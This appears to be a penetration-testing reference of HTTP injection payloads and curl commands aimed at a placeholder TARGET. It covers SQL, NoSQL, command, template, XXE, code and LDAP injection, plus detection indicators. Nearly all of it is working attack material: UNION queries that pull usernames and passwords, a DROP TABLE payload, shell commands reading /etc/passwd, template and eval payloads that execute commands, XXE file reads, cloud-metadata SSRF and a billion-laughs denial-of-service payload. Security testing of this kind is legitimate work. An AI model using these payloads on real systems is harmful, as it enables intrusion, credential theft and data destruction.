# Injection Testing Reference

Comprehensive HTTP-level injection testing payloads and detection patterns. All payloads are backend-agnostic and work regardless of server-side language.

---

## SQL Injection

### String Context

Payloads for parameters expected to contain string values (e.g., `?name=VALUE`, `{"username": "VALUE"}`):

```
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' #
' OR '1'='1'/*
" OR "1"="1
' OR 1=1 --
' UNION SELECT NULL --
' AND '1'='2
'; --
\' OR \'1\'=\'1
```

**Curl examples:**
```bash
# Query parameter injection
curl -s "http://TARGET/api/users?search=' OR '1'='1' --"

# JSON body injection
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"'\'' OR '\''1'\''='\''1","password":"test"}' \
  "http://TARGET/api/login"

# Form-encoded injection
curl -s -X POST -d "username=' OR '1'='1' --&password=test" \
  "http://TARGET/api/login"
```

### Numeric Context

Payloads for parameters expected to contain numeric values (e.g., `?id=VALUE`):

```
1 OR 1=1
1 OR 1=1 --
1 UNION SELECT NULL --
1 AND 1=2
0 OR 1=1
1; --
1) OR (1=1
```

**Curl examples:**
```bash
curl -s "http://TARGET/api/users/1 OR 1=1 --"
curl -s "http://TARGET/api/products?id=1 UNION SELECT NULL,NULL,NULL --"
```

### ORDER BY / Column Enumeration

```
1 ORDER BY 1 --
1 ORDER BY 2 --
1 ORDER BY 10 --
1 ORDER BY 100 --
```

Use incrementing column numbers until an error occurs to determine column count for UNION attacks.

### UNION-Based Extraction

```
' UNION SELECT NULL --
' UNION SELECT NULL,NULL --
' UNION SELECT NULL,NULL,NULL --
' UNION SELECT 1,2,3 --
' UNION SELECT username,password,NULL FROM users --
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables --
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users' --
```

### LIKE Clause Injection

```
%' OR '1'='1
%' OR 1=1 --
_' OR '1'='1
%'; DROP TABLE users; --
```

### Boolean-Blind SQL Injection

Send pairs of requests and compare responses:

```bash
# True condition -- should return normal response
curl -s "http://TARGET/api/users?id=1 AND 1=1 --"

# False condition -- should return different response
curl -s "http://TARGET/api/users?id=1 AND 1=2 --"
```

If responses differ (content length, status code, or specific content), boolean-blind SQLi is confirmed. Extract data one bit at a time:

```
1 AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a' --
1 AND (SELECT ASCII(SUBSTRING(username,1,1)) FROM users LIMIT 1)>96 --
```

### Time-Blind SQL Injection

```bash
# MySQL
curl -s -o /dev/null -w "%{time_total}" "http://TARGET/api/users?id=1; SELECT SLEEP(5) --"
curl -s -o /dev/null -w "%{time_total}" "http://TARGET/api/users?id=1' AND SLEEP(5) AND '1'='1"

# PostgreSQL
curl -s -o /dev/null -w "%{time_total}" "http://TARGET/api/users?id=1; SELECT pg_sleep(5) --"
curl -s -o /dev/null -w "%{time_total}" "http://TARGET/api/users?id=1' AND (SELECT pg_sleep(5))::text='1"

# MSSQL
curl -s -o /dev/null -w "%{time_total}" "http://TARGET/api/users?id=1; WAITFOR DELAY '0:0:5' --"

# SQLite
curl -s -o /dev/null -w "%{time_total}" "http://TARGET/api/users?id=1 AND 1=randomblob(500000000) --"
```

Compare response time against a baseline (no payload). A 5+ second delay indicates time-blind SQLi.

### SQL Injection Detection Indicators

- Error messages containing: `SQL syntax`, `mysql_`, `ORA-`, `PostgreSQL`, `SQLite`, `ODBC`, `Microsoft SQL`, `unterminated`, `quoted string`, `syntax error`
- Responses that return more data than expected (UNION success)
- Boolean differences between true/false conditions
- Timing differences of 5+ seconds vs baseline
- HTTP 500 errors triggered by SQL metacharacters

---

## NoSQL Injection

### MongoDB Operator Injection

```bash
# Operator injection in JSON body
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":{"$gt":""},"password":{"$gt":""}}' \
  "http://TARGET/api/login"

curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}' \
  "http://TARGET/api/login"

curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":{"$regex":".*"},"password":{"$regex":".*"}}' \
  "http://TARGET/api/login"

# Query parameter operator injection
curl -s "http://TARGET/api/users?username[\$ne]=&password[\$ne]="
curl -s "http://TARGET/api/users?username[\$gt]=&password[\$gt]="
curl -s "http://TARGET/api/users?username[\$regex]=.*&password[\$regex]=.*"
```

### MongoDB JavaScript Injection

```bash
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":{"$where":"return true"},"password":"x"}' \
  "http://TARGET/api/login"

curl -s -X POST -H "Content-Type: application/json" \
  -d '{"$where":"this.username == this.password"}' \
  "http://TARGET/api/users"
```

### NoSQL Detection Indicators

- Authentication bypass (login succeeds with operator payloads)
- Response contains all records instead of filtered results
- Error messages containing: `MongoError`, `$operator`, `BSON`, `ObjectId`
- JavaScript execution errors in responses

---

## Command Injection

### Payloads

```
; id
; whoami
| id
| whoami
|| id
& id
&& id
`id`
$(id)
; sleep 5
| sleep 5
& sleep 5
`sleep 5`
$(sleep 5)
%0aid
%0a sleep 5
; cat /etc/passwd
| cat /etc/passwd
& type C:\Windows\System32\drivers\etc\hosts
```

### Curl Examples

```bash
# In query parameters
curl -s "http://TARGET/api/ping?host=127.0.0.1;id"
curl -s "http://TARGET/api/ping?host=127.0.0.1|whoami"
curl -s "http://TARGET/api/lookup?domain=example.com;sleep+5"

# In JSON body
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; id"}' "http://TARGET/api/ping"

curl -s -X POST -H "Content-Type: application/json" \
  -d '{"filename":"test.txt; cat /etc/passwd"}' "http://TARGET/api/files"

# Time-based detection
curl -s -o /dev/null -w "%{time_total}" \
  "http://TARGET/api/ping?host=127.0.0.1;sleep+5"
```

### Command Injection Detection Indicators

- Response contains OS command output (`uid=`, `root:`, `Windows`, `COMPUTERNAME`)
- Response contains file contents (`/etc/passwd` entries, Windows system file contents)
- Timing delay matches injected sleep command
- Error messages revealing shell invocation (`sh:`, `cmd.exe`, `/bin/bash`, `exec`, `popen`)

---

## Server-Side Template Injection (SSTI)

### Universal Detection Payloads

```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
{7*7}
```

If any of these return `49` in the response, SSTI is confirmed.

### Engine-Specific Payloads

**Jinja2 (Python -- Flask, Django):**
```
{{config}}
{{config.items()}}
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()}}
```

**Twig (PHP -- Symfony):**
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{'/etc/passwd'|file_excerpt(1,30)}}
```

**EJS (Node.js):**
```
<%= process.env %>
<%= require('child_process').execSync('id') %>
```

**Handlebars (Node.js):**
```
{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('id');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
```

**Pug/Jade (Node.js):**
```
#{7*7}
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").execSync('id')}()}
```

**Freemarker (Java):**
```
${7*7}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
```

### Curl Examples

```bash
# Test in various input fields
curl -s "http://TARGET/api/render?template={{7*7}}"
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"name":"{{7*7}}"}' "http://TARGET/api/greeting"
curl -s "http://TARGET/api/search?q=\${7*7}"
```

### SSTI Detection Indicators

- Mathematical expression result in response (e.g., `49` for `7*7`)
- Template engine error messages (`TemplateSyntaxError`, `UndefinedError`, `Twig_Error`)
- Configuration data or environment variables in response
- OS command output in response

---

## XML External Entity (XXE) Injection

### Basic XXE Payloads

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]>
<root><data>&xxe;</data></root>
```

### XXE for SSRF

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>
```

### Billion Laughs (Denial of Service -- use cautiously)

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>
```

### Curl Examples

```bash
# XXE via XML body
curl -s -X POST -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>' \
  "http://TARGET/api/xml-endpoint"

# XXE via SOAP
curl -s -X POST -H "Content-Type: text/xml" -H "SOAPAction: test" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test>&xxe;</test></soap:Body></soap:Envelope>' \
  "http://TARGET/api/soap"

# XXE in file upload (SVG)
curl -s -X POST -F 'file=@xxe.svg;type=image/svg+xml' "http://TARGET/api/upload"
# Where xxe.svg contains the XXE payload
```

### XXE Detection Indicators

- File contents (e.g., `/etc/passwd`) in response
- Internal network responses in output
- XML parser error messages (`SAXParseException`, `XMLSyntaxError`, `lxml`, `libxml`)
- Server timeout or memory errors (billion laughs)

---

## Code Injection

### Payloads (Multi-Language)

**JavaScript (Node.js):**
```
require('child_process').execSync('id').toString()
process.env
global.process.mainModule.require('child_process').execSync('id')
```

**Python:**
```
__import__('os').popen('id').read()
exec('import os; os.popen("id").read()')
eval('__import__("os").popen("id").read()')
```

**PHP:**
```
system('id')
exec('id')
passthru('id')
shell_exec('id')
```

**Ruby:**
```
`id`
system('id')
exec('id')
%x(id)
```

### Curl Examples

```bash
# Code injection in eval-like parameters
curl -s "http://TARGET/api/calc?expr=require('child_process').execSync('id')"
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"code":"__import__(\"os\").popen(\"id\").read()"}' \
  "http://TARGET/api/eval"
```

### Code Injection Detection Indicators

- OS command output in response
- Error messages referencing `eval()`, `exec()`, `Function()`, `compile()`
- Language-specific error messages (SyntaxError, NameError, TypeError)

---

## LDAP Injection

### Payloads

```
*
*)(&
*))%00
)(cn=*))(|(cn=*
admin)(|(password=*))
*)(uid=*))(|(uid=*
```

### Curl Examples

```bash
curl -s "http://TARGET/api/ldap-search?user=*)(uid=*))(|(uid=*"
curl -s -X POST -d "username=admin)(|(password=*))&password=test" \
  "http://TARGET/api/ldap-login"
```

### LDAP Detection Indicators

- More results returned than expected
- Authentication bypass
- Error messages containing: `LDAP`, `javax.naming`, `ldap_search`, `InvalidNameException`

---

## General Injection Testing Strategy

1. **Identify input points**: All query parameters, JSON body fields, form fields, HTTP headers, cookies, file upload names
2. **Send baseline request**: Record normal response status, length, and content
3. **Inject metacharacters first**: `' " ; | & < > { } $ ( ) \` -- observe which trigger errors
4. **Select payload category**: Based on error messages and context, choose SQL, NoSQL, command, template, or code injection payloads
5. **Escalate**: Move from detection to extraction (UNION-based, boolean-blind, time-blind)
6. **Document**: Record exact curl command and response for every confirmed finding
